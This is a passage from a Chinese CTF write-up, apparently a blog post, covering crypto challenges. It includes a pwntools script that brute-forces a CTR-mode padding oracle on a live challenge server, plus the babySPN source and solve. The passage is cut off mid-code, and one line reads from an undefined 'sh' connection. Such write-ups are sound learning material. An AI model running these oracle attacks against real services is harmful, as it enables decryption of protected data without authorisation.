class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">    server.listen(<span class="number">100</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_sock, address = server.accept()</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Accepted connection from <span class="subst">&#123;address[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;address[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            client_handler = threading.Thread(target=task, args=(client_sock,))</span><br><span class="line">            client_handler.start()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-1-简化proof函数"><a href="#0x04-1-简化proof函数" class="headerlink" title="0x04.1 简化proof函数"></a>0x04.1 简化proof函数</h2><p>拿到前几个序列的数不知道咋搞，上谷歌搜，居然在杨辉三角里找到了对应的数，勾起极大的兴趣，于是 <code>pip install pascal</code> 跑测试。其结果也很简单，就是 <code>binomial(s+13,14)</code>。</p><p>赛后知道可以用 <a href="https://oeis.org/">https://oeis.org/</a> 查数列，厉害厉害。</p><h2 id="0x04-2-CTR-Oracle"><a href="#0x04-2-CTR-Oracle" class="headerlink" title="0x04.2 CTR Oracle"></a>0x04.2 CTR Oracle</h2><p>CTR模式中，AES加密的是Counter，然后把加密得到的Counter与明文异或得到密文。因此，我们对输入1得到的flag密文，改变其中任意一个不是padding位置的字节，在AES解密后得到的明文中，就也只有这一个位置的字节被改变了。</p><p>而我们对这一个被改变的字节，遍历256种可能取值，当且仅当解密后的明文恰为padding字节的值时，靶机会返回给我们failed，因为这个时候padding字节多出来一个。我们将这时候的这个字节值记为<strong>t</strong>。</p><p>而padding字节的值是多少，这个我们是知道的，因为我们从输入1返回的密文中，可以知道flag的长度是42，也就自然知道了有几个分组。我们把它记为<strong>r</strong>。而CTR模式又有一个很重要的性质，也就是同一分组的明文异或等于密文异或，因此对于当前这个字节，其本身的加密值是enc的话，我们就可以由：<br>$$<br>m&#x3D;enc \oplus t\oplus r<br>$$<br>求出当前这个字节的明文值。因此我们就可以逐字符爆破，并求出flag的全部内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> sage.functions.other <span class="keyword">import</span> binomial </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rec = remote(<span class="string">&quot;1.14.108.193&quot;</span>, <span class="built_in">int</span>(<span class="number">31310</span>)) </span><br><span class="line">r = rec.recvuntil(<span class="string">b&#x27;Give me a hash&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(r) </span><br><span class="line">s = <span class="built_in">int</span>(r.split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">4</span>:].decode(),<span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(s) </span><br><span class="line">hs = <span class="built_in">str</span>(sha256(<span class="built_in">str</span>(binomial(s+<span class="number">13</span>,<span class="number">14</span>)).encode()).hexdigest()).encode() </span><br><span class="line"><span class="built_in">print</span>(hs)</span><br><span class="line">rec.sendline(hs) </span><br><span class="line">rec.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">rec.recvuntil(<span class="string">b&quot;This is Your flag &quot;</span>)</span><br><span class="line">enc_flag = b64decode(sh.recvline().strip().decode()[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#group2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">33</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#group3</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>,<span class="number">43</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">256</span>):</span><br><span class="line">            rec.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">            msg = enc_flag[:i] + long_to_bytes(j) + enc_flag[i+<span class="number">1</span>:]</span><br><span class="line">            rec.sendline(msg)</span><br><span class="line">            rec.recvuntil(<span class="string">b&quot;Dec &quot;</span>)</span><br><span class="line">            temp = rec.recvline()</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">b&quot;fail&quot;</span> <span class="keyword">in</span> temp):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(j ^ enc_flag[i] ^ <span class="number">2</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">rec.close()</span><br></pre></td></tr></table></figure><h1 id="0x05-babySPN"><a href="#0x05-babySPN" class="headerlink" title="0x05. babySPN"></a>0x05. babySPN</h1><p>类DES加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> <span class="comment"># 计算了当前轮次所使用的子密钥的起始索引。</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># 查找</span></span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> <span class="comment"># 置换</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">7</span>:-<span class="number">1</span>] == hash_value</span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(enc(XX,K))</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1]</span></span><br><span class="line"><span class="comment"># [0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0]</span></span><br></pre></td></tr></table></figure><p>特么的K已知啊，直接跑题目得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">P=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">S=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> </span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): </span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = S[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[P[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash_value)</span><br></pre></td></tr></table></figure><h3 id="0x06-babySPN-revenge"><a href="#0x06-babySPN-revenge" class="headerlink" title="0x06. babySPN_revenge"></a>0x06. babySPN_revenge</h3><p>中间相遇 yyds</p><h2 id="0x06-1-准备工作"><a href="#0x06-1-准备工作" class="headerlink" title="0x06.1 准备工作"></a>0x06.1 准备工作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> <span class="comment"># 计算了当前轮次所使用的子密钥的起始索引。</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># 查找</span></span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> <span class="comment"># 置换</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span 